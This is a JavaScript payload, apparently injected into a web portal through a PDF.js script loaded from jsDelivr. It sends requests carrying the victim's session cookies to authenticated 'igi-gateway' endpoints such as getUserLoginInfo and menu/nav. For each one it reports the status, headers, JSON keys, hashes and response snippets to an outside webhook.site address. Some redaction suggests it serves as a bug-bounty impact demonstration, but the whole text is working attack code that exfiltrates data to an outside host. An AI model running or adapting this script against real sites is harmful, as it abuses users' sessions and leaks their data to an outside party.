
console.warn("PDFJS_API_BASELINE_STAGE_FROM_JSDELIVR_EXECUTED", self.location && self.location.href);
(function(){
  var webhook = "https://36.webhook.site/80f0e3ea-047f-4cc9-85d0-135e41459ca3";
  var probes = [
    {label:"public_api_getPubKey_200_full_sample", url:"/igi-gateway/igi-edge-portal/user/getPubKey", publicBody:true},
    {label:"public_api_getVerifyCode_200_metadata", url:"/igi-gateway/igi-edge-portal/user/getVerifyCode?uuid=pdfjs-impact-20260701", publicBody:false},
    {label:"high_getUserLoginInfo_gateway_edge", url:"/igi-gateway/igi-edge-portal/sys/user/getUserLoginInfo"},
    {label:"high_getUserLoginInfo_gateway", url:"/igi-gateway/sys/user/getUserLoginInfo"},
    {label:"high_getUserLoginInfo_root", url:"/sys/user/getUserLoginInfo"},
    {label:"high_menu_nav_gateway_edge", url:"/igi-gateway/igi-edge-portal/sys/menu/nav"},
    {label:"high_menu_nav_gateway", url:"/igi-gateway/sys/menu/nav"},
    {label:"high_menu_nav_root", url:"/sys/menu/nav"}
  ];
  function enc(v){try{return encodeURIComponent(String(v));}catch(e){return "enc_error";}}
  function fnv1a(s){
    var h=2166136261;
    for(var i=0;i<s.length;i++){h^=s.charCodeAt(i); h+=(h<<1)+(h<<4)+(h<<7)+(h<<8)+(h<<24);}
    return ("00000000"+(h>>>0).toString(16)).slice(-8);
  }
  function headersOf(r){
    var out=[];
    try{r.headers.forEach(function(v,k){out.push(k+":"+v);});}catch(e){}
    return out.slice(0,20).join("|");
  }
  function topKeys(t){
    try {
      var j=JSON.parse(t);
      if (j && typeof j === "object") {
        var obj = Array.isArray(j) ? (j[0] || {}) : j;
        return Object.keys(obj).slice(0,30).join(",");
      }
    } catch(e) {}
    return "";
  }
  function redactPublicApiBody(t){
    try {
      var j=JSON.parse(t);
      if (j && typeof j === "object" && typeof j.data === "string") {
        j.data = j.data.slice(0,36) + "...[public-key-truncated]";
        return JSON.stringify(j);
      }
    } catch(e) {}
    return t.slice(0,1200);
  }
  function safeSnippet(t, isPublic){
    if (isPublic) return redactPublicApiBody(t);
    var s = t.slice(0,220).replace(/[\r\n\t]+/g, " ");
    if (/token|authorization|cookie|password|phone|email|mobile|idcard|public key/i.test(s)) return "[redacted_sensitive_like_content]";
    return s;
  }
  function hitGet(stage, params){
    try{fetch(webhook+"?stage="+enc(stage)+"&"+params,{mode:"no-cors",credentials:"omit",cache:"no-store"}).catch(function(){});}catch(e){}
  }
  function hitPost(stage, body){
    try{
      fetch(webhook+"?stage="+enc(stage),{
        method:"POST",
        mode:"no-cors",
        credentials:"omit",
        cache:"no-store",
        headers:{"Content-Type":"text/plain;charset=UTF-8"},
        body:JSON.stringify(body)
      }).catch(function(){});
    }catch(e){}
  }
  hitGet("api_baseline_stage_loaded", "origin="+enc(self.location && (self.location.origin||self.location.href)));
  probes.forEach(function(p, idx){
    fetch(p.url, {credentials:"include", cache:"no-store"})
      .then(function(r){return r.text().then(function(t){
        var ct=""; try{ct=r.headers.get("content-type")||"";}catch(e){}
        var keys=topKeys(t);
        var hash=fnv1a(t.slice(0,4096));
        var snippet=safeSnippet(t, !!p.publicBody);
        console.warn("PDFJS_API_BASELINE_PROBE", p.label, p.url, "status="+r.status, "len="+t.length, "ct="+ct, "keys="+keys, "hash="+hash, "snippet="+snippet);
        hitGet("api_baseline_metadata", "idx="+idx+"&label="+enc(p.label)+"&url="+enc(p.url)+"&status="+r.status+"&len="+t.length+"&ct="+enc(ct)+"&keys="+enc(keys)+"&h="+hash+"&snippet="+enc(snippet));
        if (p.publicBody && r.status === 200) {
          hitPost("api_baseline_public_200_response_sample", {label:p.label,url:p.url,status:r.status,headers:headersOf(r),body:snippet,note:"public login-pre API sample, public-key truncated"});
        }
      });})
      .catch(function(e){
        var m=e&&e.message||String(e);
        console.warn("PDFJS_API_BASELINE_PROBE_ERR", p.label, p.url, m);
        hitGet("api_baseline_metadata_error", "idx="+idx+"&label="+enc(p.label)+"&url="+enc(p.url)+"&err="+enc(m));
      });
  });
})();
